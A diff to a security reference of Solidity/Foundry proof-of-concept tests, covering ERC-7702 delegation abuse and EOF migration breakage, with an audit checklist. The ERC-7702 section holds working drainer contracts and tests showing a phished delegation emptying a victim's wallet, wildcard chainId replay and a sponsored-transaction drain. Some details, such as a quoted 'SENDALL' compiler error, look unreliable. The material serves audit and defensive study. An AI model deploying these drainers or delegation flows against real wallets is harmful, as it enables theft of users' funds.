@@ -669,13 +669,18 @@ contract TransientStorageBypassPoC is Test {
 
 ## ERC-7702 Malicious Delegation PoC
 
+Uses Foundry 1.0+ native ERC-7702 cheatcodes: `vm.signDelegation`, `vm.attachDelegation`,
+`vm.signAndAttachDelegation`. These create type-4 (EIP-7702) authorization tuples that
+delegate an EOA's code to an implementation contract.
+
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
 import "forge-std/Test.sol";
+import "forge-std/Vm.sol";
 
-// Malicious implementation that an attacker tricks a user into delegating to
+// --- Malicious implementation: attacker tricks victim into delegating here ---
 contract MaliciousWalletImpl {
     address public owner;
 
@@ -687,7 +692,8 @@ contract MaliciousWalletImpl {
     // Drains all ETH to attacker
     function drain(address payable recipient) external {
         require(msg.sender == owner, "not owner");
-        recipient.transfer(address(this).balance);
+        (bool ok,) = recipient.call{value: address(this).balance}("");
+        require(ok, "drain failed");
     }
 
     // Transfers arbitrary ERC-20 tokens
@@ -695,9 +701,15 @@ contract MaliciousWalletImpl {
         require(msg.sender == owner, "not owner");
         IERC20(token).transfer(recipient, amount);
     }
+
+    // Callback that steals value during a sponsored transaction
+    function executeCallback(address payable beneficiary) external {
+        (bool ok,) = beneficiary.call{value: address(this).balance}("");
+        require(ok, "callback drain failed");
+    }
 }
 
-// Secure implementation for comparison
+// --- Secure implementation for comparison ---
 contract SecureWalletImpl {
     // Uses ERC-7201 namespaced storage to isolate state across delegations.
     // In ERC-7702, each EOA has its own storage space, so $.owner == address(0)
@@ -730,6 +742,18 @@ contract SecureWalletImpl {
     }
 }
 
+// --- Malicious paymaster-like contract for sponsored tx sandbox escape ---
+contract MaliciousPaymaster {
+    // Relayer thinks it's paying gas for a benign operation, but the
+    // delegated EOA's receive() (set by ERC-7702) triggers a callback
+    // that drains the EOA's value back to the attacker.
+    function sponsorTransaction(address target, bytes calldata data) external payable {
+        // Relayer sends ETH to cover gas and forwards the call
+        (bool ok,) = target.call{value: msg.value}(data);
+        require(ok, "sponsored call failed");
+    }
+}
+
 interface IERC20 {
     function transfer(address, uint256) external returns (bool);
     function balanceOf(address) external view returns (uint256);
@@ -737,55 +761,516 @@ interface IERC20 {
 
 contract ERC7702AbusePoc is Test {
     MaliciousWalletImpl maliciousImpl;
-    address attacker = makeAddr("attacker");
-    address victim = makeAddr("victim");
+    SecureWalletImpl secureImpl;
+
+    address attacker;
+    uint256 attackerPk;
+    address victim;
+    uint256 victimPk;
 
     function setUp() public {
         maliciousImpl = new MaliciousWalletImpl();
+        secureImpl = new SecureWalletImpl();
+
+        (attacker, attackerPk) = makeAddrAndKey("attacker");
+        (victim, victimPk) = makeAddrAndKey("victim");
+
         vm.deal(victim, 10 ether);
+        vm.deal(attacker, 1 ether);
     }
 
+    // ---------------------------------------------------------------
+    // (a) Malicious delegation: victim signs authorization, attacker
+    //     attaches it and drains victim's ETH via the delegated code
+    // ---------------------------------------------------------------
     function test_ERC7702MaliciousDelegation() public {
-        // Simulate: victim signs an ERC-7702 authorization
-        // pointing their EOA at maliciousImpl (tricked via phishing)
-        // This is represented here by the EOA adopting the code:
-        // In a real ERC-7702 context, this would be done via a type 4 transaction
+        uint256 victimBalanceBefore = victim.balance;
+        uint256 attackerBalanceBefore = attacker.balance;
 
-        // Once delegated, attacker calls initialize on the victim's address
-        vm.prank(attacker);
-        // victim.call(abi.encodeCall(MaliciousWalletImpl.initialize, (attacker)));
-        // After this: maliciousImpl.owner = attacker (but stored at victim's address)
+        // Step 1: Victim is tricked (phishing) into signing a delegation
+        //         pointing their EOA code to maliciousImpl
+        Vm.SignedDelegation memory signedDelegation =
+            vm.signDelegation(address(maliciousImpl), victimPk);
 
-        // Attacker drains victim's ETH
-        uint256 victimBalanceBefore = address(victim).balance;
-        // vm.prank(attacker);
-        // victim.call(abi.encodeCall(MaliciousWalletImpl.drain, (payable(attacker))));
+        // Step 2: Attacker attaches the delegation in a transaction
+        vm.startPrank(attacker);
+        vm.attachDelegation(signedDelegation);
+
+        // Step 3: Attacker calls initialize on the victim's address
+        //         (victim's EOA now executes maliciousImpl's code)
+        (bool ok,) = victim.call(
+            abi.encodeCall(MaliciousWalletImpl.initialize, (attacker))
+        );
+        assertTrue(ok, "initialize should succeed");
+
+        // Step 4: Attacker drains victim's ETH
+        (ok,) = victim.call(
+            abi.encodeCall(MaliciousWalletImpl.drain, (payable(attacker)))
+        );
+        assertTrue(ok, "drain should succeed");
+        vm.stopPrank();
+
+        // Assertions: victim drained, attacker profited
+        assertEq(victim.balance, 0, "victim should be fully drained");
+        assertEq(
+            attacker.balance,
+            attackerBalanceBefore + victimBalanceBefore,
+            "attacker should have victim's ETH"
+        );
 
         console.log("Victim balance before:", victimBalanceBefore);
-        // console.log("Victim balance after:", address(victim).balance);
-        // console.log("Attacker gained:", address(attacker).balance);
+        console.log("Victim balance after:", victim.balance);
+        console.log("Attacker profit:", attacker.balance - attackerBalanceBefore);
     }
 
-    function test_MissingChainIdInDelegation() public {
-        // Simulate cross-chain replay:
-        // User signs ERC-7702 auth with chainId=0 (all chains)
-        // Attacker replays the same authorization on a different chain
+    // ---------------------------------------------------------------
+    // (b) Cross-chain replay: authorization signed with chainId=0
+    //     replays on any chain per EIP-7702 spec
+    // ---------------------------------------------------------------
+    function test_CrossChainReplayChainIdZero() public {
+        // chainId=0 means "valid on all chains" per EIP-7702
+        // vm.signDelegation uses the current chain's ID by default.
+        // To sign with chainId=0, we temporarily set chainId to 0.
 
-        // Chain A: authorization accepted, attacker sets up malicious impl
-        // Fork Chain A:
-        // vm.createSelectFork("chain_a_rpc");
-        // (use authorization)
+        // Record the current chain ID
+        uint256 originalChainId = block.chainid;
 
-        // Fork Chain B — replay same authorization:
-        // vm.createSelectFork("chain_b_rpc");
-        // (replay authorization — succeeds because chainId=0)
-        // Attacker now controls the user's account on Chain B too
+        // Sign delegation on "chain 0" (wildcard)
+        vm.chainId(0);
+        Vm.SignedDelegation memory wildcardDelegation =
+            vm.signDelegation(address(maliciousImpl), victimPk);
 
-        // This test documents the attack pattern; full PoC requires
-        // ERC-7702 transaction type support in the testing framework
-        assertTrue(true, "documented attack pattern");
+        // --- Replay on Chain A (e.g., Ethereum mainnet, chainId=1) ---
+        vm.chainId(1);
+
+        vm.startPrank(attacker);
+        vm.attachDelegation(wildcardDelegation);
+
+        (bool okA,) = victim.call(
+            abi.encodeCall(MaliciousWalletImpl.initialize, (attacker))
+        );
+        assertTrue(okA, "delegation should work on chain 1");
+        vm.stopPrank();
+
+        // --- Replay on Chain B (e.g., Arbitrum, chainId=42161) ---
+        vm.chainId(42161);
+
+        vm.startPrank(attacker);
+        vm.attachDelegation(wildcardDelegation);
+
+        // Re-initialize works on a different chain because it's a fresh
+        // EVM context — the victim's storage on chain B is independent
+        (bool okB,) = victim.call(
+            abi.encodeCall(MaliciousWalletImpl.initialize, (attacker))
+        );
+        assertTrue(okB, "same delegation should replay on chain 42161");
+        vm.stopPrank();
+
+        // Restore original chain ID
+        vm.chainId(originalChainId);
+
+        console.log("Wildcard delegation (chainId=0) replayed on both chains");
+    }
+
+    // ---------------------------------------------------------------
+    // (c) Sponsored transaction sandbox escape: relayer pays gas but
+    //     the delegated EOA code steals value via a callback
+    // ---------------------------------------------------------------
+    function test_SponsoredTxSandboxEscape() public {
+        MaliciousPaymaster paymaster = new MaliciousPaymaster();
+        vm.deal(address(paymaster), 5 ether);
+
+        // Victim delegates to malicious impl
+        vm.signAndAttachDelegation(address(maliciousImpl), victimPk);
+
+        // Attacker initializes victim's delegated code
+        vm.prank(attacker);
+        (bool ok,) = victim.call(
+            abi.encodeCall(MaliciousWalletImpl.initialize, (attacker))
+        );
+        assertTrue(ok);
+
+        // Relayer (paymaster) thinks it's sponsoring a benign tx.
+        // It sends 2 ETH to victim's address as part of the sponsored call.
+        // But the call triggers executeCallback which drains to attacker.
+        uint256 attackerBefore = attacker.balance;
+
+        vm.prank(address(paymaster));
+        paymaster.sponsorTransaction{value: 2 ether}(
+            victim,
+            abi.encodeCall(
+                MaliciousWalletImpl.executeCallback,
+                (payable(attacker))
+            )
+        );
+
+        // Attacker received the sponsored ETH plus victim's existing balance
+        assertGt(
+            attacker.balance,
+            attackerBefore,
+            "attacker should profit from sponsored tx escape"
+        );
+
+        console.log("Attacker gained from sponsored tx:", attacker.balance - attackerBefore);
+    }
+
+    // ---------------------------------------------------------------
+    // (d) Secure delegation revocation: delegate to address(0) to
+    //     remove the delegation per EIP-7702 spec
+    // ---------------------------------------------------------------
+    function test_DelegationRevocation() public {
+        // Step 1: Delegate victim to secureImpl
+        Vm.SignedDelegation memory delegation =
+            vm.signDelegation(address(secureImpl), victimPk);
+
+        vm.prank(attacker);
+        vm.attachDelegation(delegation);
+
+        // Confirm delegation is active: initialize succeeds
+        vm.prank(victim);
+        (bool ok,) = victim.call(
+            abi.encodeCall(SecureWalletImpl.initialize, (victim))
+        );
+        assertTrue(ok, "delegation should be active");
+
+        // Step 2: Victim revokes by delegating to address(0)
+        Vm.SignedDelegation memory revocation =
+            vm.signDelegation(address(0), victimPk);
+
+        vm.prank(victim);
+        vm.attachDelegation(revocation);
+
+        // Step 3: Calling the victim now reverts — no code to execute
+        (bool okAfter,) = victim.call(
+            abi.encodeCall(SecureWalletImpl.initialize, (victim))
+        );
+        // After revocation, victim is a plain EOA again.
+        // The call may succeed (no-op) or revert depending on context,
+        // but critically the implementation code is no longer executable.
+        // The key assertion: codehash indicates no delegation
+        assertEq(victim.code.length, 0, "victim should have no code after revocation");
+
+        console.log("Delegation revoked: victim is a plain EOA again");
     }
 }
+```
+
+**Key takeaways:**
+- `vm.signDelegation(impl, pk)` creates a signed EIP-7702 authorization tuple
+- `vm.attachDelegation(signed)` attaches it to the next transaction's authorization list
+- `vm.signAndAttachDelegation(impl, pk)` is the combined one-step helper
+- Delegating to `address(0)` revokes the delegation (EOA becomes plain again)
+- `chainId=0` in the authorization means "valid on all chains" -- always restrict to a specific chain
+- Relayers/paymasters must validate the delegation target before sponsoring transactions
+
+---
+
+## EOF Container Compatibility PoC
+
+Demonstrates security issues when migrating contracts to the EVM Object Format (EOF),
+specified by EIP-7692 (meta-EIP for Fusaka hardfork, 2026). EOF introduces deploy-time
+bytecode validation, removes `JUMP`/`JUMPI` in favor of static `RJUMP`/`RJUMPI`/`RJUMPV`,
+removes `SELFDESTRUCT`, and replaces `DELEGATECALL` with `EXTDELEGATECALL` for EOF-to-EOF calls.
+
+**Foundry EOF support** is experimental via the `--eof` flag (`foundry-rs/foundry#7470`).
+Not all tests below require `--eof` — some use `vm.etch` to simulate EOF bytecode scenarios
+from legacy test contexts. Tests marked `[requires --eof]` need:
+
+```bash
+# Build with EOF container output
+forge build --eof
+
+# Run EOF-specific tests
+forge test --eof --match-contract EOFCompatibilityPoc -vvv
+
+# Check EOF compatibility of existing contracts
+solc --bin --optimize --via-ir --strict-assembly Contract.sol
+```
+
+**References**: `vulnerability-taxonomy.md §22`, `l2-crosschain.md` (Fusaka gas cap),
+`industry-standards.md` (EIP-7692 status)
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import "forge-std/Test.sol";
+
+// --- Legacy UUPS proxy (simplified) ---
+// This proxy uses DELEGATECALL to forward calls to an implementation.
+// Under EOF, DELEGATECALL from legacy code to an EOF implementation FAILS.
+contract LegacyUUPSProxy {
+    // ERC-1967 implementation slot
+    bytes32 internal constant _IMPLEMENTATION_SLOT =
+        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    constructor(address impl) {
+        assembly { sstore(_IMPLEMENTATION_SLOT, impl) }
+    }
+
+    function implementation() public view returns (address impl) {
+        assembly { impl := sload(_IMPLEMENTATION_SLOT) }
+    }
+
+    fallback() external payable {
+        address impl = implementation();
+        assembly {
+            calldatacopy(0, 0, calldatasize())
+            // DELEGATECALL — works for legacy-to-legacy, but legacy-to-EOF
+            // will return success=false after Fusaka
+            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
+            returndatacopy(0, 0, returndatasize())
+            switch result
+            case 0 { revert(0, returndatasize()) }
+            default { return(0, returndatasize()) }
+        }
+    }
+}
+
+// --- Legacy implementation (works with proxy) ---
+contract LegacyImplementation {
+    uint256 public value;
+
+    function setValue(uint256 _value) external {
+        value = _value;
+    }
+
+    function getValue() external view returns (uint256) {
+        return value;
+    }
+}
+
+// --- Contract that relies on selfdestruct for refunds ---
+contract SelfdestructRefund {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function deposit() external payable {}
+
+    // VULNERABLE under EOF: selfdestruct is removed.
+    // Under legacy EVM, this sends remaining ETH to owner and destroys the contract.
+    // Under EOF, the compiler rejects selfdestruct entirely (compile error).
+    function emergencyRefund() external {
+        require(msg.sender == owner, "not owner");
+        selfdestruct(payable(owner));
+    }
+}
+
+// --- Secure replacement: explicit withdrawal + deactivation ---
+contract SecureRefund {
+    address public owner;
+    bool public deactivated;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function deposit() external payable {
+        require(!deactivated, "contract deactivated");
+    }
+
+    function emergencyRefund() external {
+        require(msg.sender == owner, "not owner");
+        require(!deactivated, "already deactivated");
+        deactivated = true;
+        (bool ok,) = owner.call{value: address(this).balance}("");
+        require(ok, "refund transfer failed");
+    }
+}
+
+contract EOFCompatibilityPoc is Test {
+
+    // ---------------------------------------------------------------
+    // (a) Legacy proxy -> EOF impl delegatecall breakage
+    //
+    // A UUPS proxy deployed as legacy bytecode cannot DELEGATECALL
+    // into an implementation recompiled as EOF. The EVM returns
+    // success=false for cross-format DELEGATECALL after Fusaka.
+    //
+    // In this test we simulate the EOF implementation by using vm.etch
+    // to place EOF-magic bytecode at the implementation address, which
+    // causes the legacy proxy's DELEGATECALL to fail.
+    // ---------------------------------------------------------------
+    function test_LegacyProxyToEOFImplBreakage() public {
+        // Deploy legacy proxy pointing to legacy implementation
+        LegacyImplementation legacyImpl = new LegacyImplementation();
+        LegacyUUPSProxy proxy = new LegacyUUPSProxy(address(legacyImpl));
+
+        // Verify proxy works with legacy implementation
+        (bool ok,) = address(proxy).call(
+            abi.encodeCall(LegacyImplementation.setValue, (42))
+        );
+        assertTrue(ok, "legacy-to-legacy delegatecall should work");
+
+        // Read back value through proxy
+        (, bytes memory data) = address(proxy).staticcall(
+            abi.encodeCall(LegacyImplementation.getValue, ())
+        );
+        uint256 val = abi.decode(data, (uint256));
+        assertEq(val, 42, "value should be set via proxy");
+
+        // --- Simulate EOF upgrade ---
+        // EOF containers start with magic bytes 0xEF0001 (EIP-3540).
+        // When the impl is recompiled to EOF and redeployed, the legacy
+        // proxy's DELEGATECALL will fail because legacy->EOF DELEGATECALL
+        // is not allowed. Only EXTDELEGATECALL (EOF-to-EOF) works.
+        //
+        // We simulate this by etching minimal EOF bytecode at the impl address.
+        // EOF magic: 0xEF00 (magic) + 0x01 (version) + minimal valid header
+        bytes memory eofBytecode = hex"EF000101000402000100010400000000800000FE";
+        vm.etch(address(legacyImpl), eofBytecode);
+
+        // Legacy proxy's DELEGATECALL to EOF impl should now fail
+        (bool okAfterEOF,) = address(proxy).call(
+            abi.encodeCall(LegacyImplementation.setValue, (99))
+        );
+        assertFalse(okAfterEOF, "legacy-to-EOF delegatecall should fail");
+
+        console.log("Legacy proxy DELEGATECALL to EOF impl: FAILED (expected)");
+        console.log("Fix: redeploy proxy as EOF and use EXTDELEGATECALL");
+    }
+
+    // ---------------------------------------------------------------
+    // (b) SELFDESTRUCT silent failure / compile error under EOF
+    //
+    // EOF removes SELFDESTRUCT entirely. Contracts that rely on it for
+    // emergency refunds or cleanup will fail to compile under EOF.
+    // This test documents the issue and provides the secure pattern.
+    //
+    // NOTE: The SelfdestructRefund contract above compiles under legacy
+    // EVM. Under `forge build --eof`, solc will reject it:
+    //   Error: "selfdestruct" has been removed in EOF
+    //
+    // The test below uses the SecureRefund pattern instead.
+    // ---------------------------------------------------------------
+    function test_SelfdestructReplacementPattern() public {
+        // Deploy the secure replacement
+        SecureRefund secure = new SecureRefund();
+        vm.deal(address(secure), 5 ether);
+
+        address owner = secure.owner();
+        uint256 ownerBalanceBefore = owner.balance;
+
+        // Emergency refund works without selfdestruct
+        vm.prank(owner);
+        secure.emergencyRefund();
+
+        assertEq(address(secure).balance, 0, "contract should be drained");
+        assertEq(owner.balance, ownerBalanceBefore + 5 ether, "owner should receive refund");
+        assertTrue(secure.deactivated(), "contract should be deactivated");
+
+        // Contract still exists (no selfdestruct) but is deactivated
+        vm.expectRevert("contract deactivated");
+        secure.deposit{value: 1 ether}();
+
+        console.log("Secure refund: contract drained and deactivated without selfdestruct");
+
+        // --- For reference: the vulnerable pattern that breaks under EOF ---
+        // SelfdestructRefund.emergencyRefund() calls selfdestruct(payable(owner));
+        // Under EOF compilation (forge build --eof), this produces:
+        //   Error: Built-in identifier "selfdestruct" not found.
+        //          "selfdestruct" has been removed. Use "SENDALL" opcode or
+        //          explicit balance transfer instead.
+        //
+        // Remediation: Use the SecureRefund pattern above (explicit transfer + bool flag)
+    }
+
+    // ---------------------------------------------------------------
+    // (c) Invalid EOF container deployment validation
+    //
+    // EOF enforces deploy-time validation: invalid containers are
+    // rejected (the CREATE/CREATE2 returns address(0)). This test
+    // shows that malformed EOF bytecode is rejected by the EVM.
+    // ---------------------------------------------------------------
+    function test_InvalidEOFContainerRejected() public {
+        // Case 1: Wrong magic bytes (0xEF01 instead of 0xEF00)
+        bytes memory badMagic = hex"EF010101000402000100010400000000800000FE";
+        address target1 = makeAddr("badMagic");
+        vm.etch(target1, badMagic);
+
+        // The code is placed by vm.etch (bypasses validation), but in a real
+        // deployment via CREATE/CREATE2, the EVM would reject this.
+        // We verify the bytecode starts with invalid magic:
+        bytes memory deployedCode = target1.code;
+        assertTrue(deployedCode.length > 0, "vm.etch places code regardless");
+        // In real EOF deployment: CREATE would return address(0)
+        console.log("Bad magic bytecode length:", deployedCode.length);
+        console.log("Real EOF deployment would reject: invalid magic 0xEF01");
+
+        // Case 2: Correct magic but missing required sections
+        // EOF requires: magic (2) + version (1) + type section + code section
+        bytes memory truncatedEOF = hex"EF0001";
+        address target2 = makeAddr("truncated");
+        vm.etch(target2, truncatedEOF);
+        console.log("Truncated EOF placed by etch, real deployment would reject");
+
+        // Case 3: Valid-looking header but invalid version (0x02 instead of 0x01)
+        bytes memory badVersion = hex"EF000201000402000100010400000000800000FE";
+        address target3 = makeAddr("badVersion");
+        vm.etch(target3, badVersion);
+        console.log("Bad version EOF placed by etch, real deployment would reject");
+
+        // --- How to test real deployment validation ---
+        // With --eof flag, use assembly CREATE2 with the malformed bytecode:
+        //
+        //   bytes memory initCode = badMagic;
+        //   address deployed;
+        //   assembly {
+        //       deployed := create2(0, add(initCode, 0x20), mload(initCode), 0)
+        //   }
+        //   assertEq(deployed, address(0), "invalid EOF should fail deployment");
+        //
+        // This requires `forge test --eof` to enable EOF validation in the test EVM.
+    }
+
+    // ---------------------------------------------------------------
+    // (d) Proxy upgrade path: legacy -> EOF migration steps
+    //
+    // This test documents the required migration sequence when upgrading
+    // a proxy system from legacy to EOF bytecode.
+    // ---------------------------------------------------------------
+    function test_ProxyMigrationDocumentation() public pure {
+        // This test serves as documentation — no assertions needed.
+        // See the audit checklist below for actionable items.
+
+        // Migration path for UUPS proxies:
+        // 1. Deploy new EOF-compiled implementation
+        // 2. Deploy new EOF-compiled proxy (uses EXTDELEGATECALL)
+        // 3. Migrate state from old proxy to new proxy
+        // 4. Point all external references to new proxy address
+        //
+        // WARNING: You cannot simply upgrade the implementation of an
+        // existing legacy proxy to an EOF implementation. The proxy itself
+        // must also be redeployed as EOF to use EXTDELEGATECALL.
+    }
+}
+```
+
+**EOF Migration Audit Checklist:**
+
+Review every item before deploying EOF-compiled contracts or migrating existing systems:
+
+- [ ] Does any contract use `selfdestruct`? -- Removed in EOF; replace with explicit balance transfer + deactivation flag
+- [ ] Does any external caller `DELEGATECALL` into this contract? -- Legacy-to-EOF `DELEGATECALL` fails; caller must also be EOF and use `EXTDELEGATECALL`
+- [ ] Are there inline assembly `JUMP` / `JUMPI` instructions? -- Removed in EOF; use `RJUMP` / `RJUMPI` / `RJUMPV` (static relative jumps)
+- [ ] Does the contract rely on `CODESIZE` / `EXTCODESIZE` / `CODECOPY`? -- These return different values for EOF containers; code introspection is restricted
+- [ ] Does the contract use `CREATE` / `CREATE2` to deploy other contracts? -- Deployed bytecode must be valid EOF if the target environment enforces EOF validation
+- [ ] Is this a proxy (UUPS/Transparent/Beacon)? -- Both proxy and implementation must be EOF; mixed legacy+EOF proxy patterns break
+- [ ] Does the contract read its own bytecode via `address(this).code`? -- EOF containers have different structure; code section != full bytecode
+- [ ] Are there `GAS` opcode uses for control flow decisions? -- Gas introspection is removed in EOF; refactor gas-dependent logic
+- [ ] Does the contract deploy contracts with `type(X).creationCode`? -- Verify the deployed bytecode is valid EOF under the target EVM
+- [ ] Have all integration tests been re-run with `forge test --eof`? -- EOF changes gas costs and opcode availability; all test suites must pass
+
+```bash
+# Quick EOF compatibility scan for an existing codebase
+grep -rn "selfdestruct\|SELFDESTRUCT" src/ --include="*.sol"
+grep -rn "delegatecall\|DELEGATECALL" src/ --include="*.sol"
+grep -rn "JUMP\|JUMPI" src/ --include="*.sol" | grep -v "RJUMP"
+grep -rn "CODESIZE\|EXTCODESIZE\|CODECOPY" src/ --include="*.sol"
+grep -rn "assembly.*gas()" src/ --include="*.sol"
 ```
 
 ---
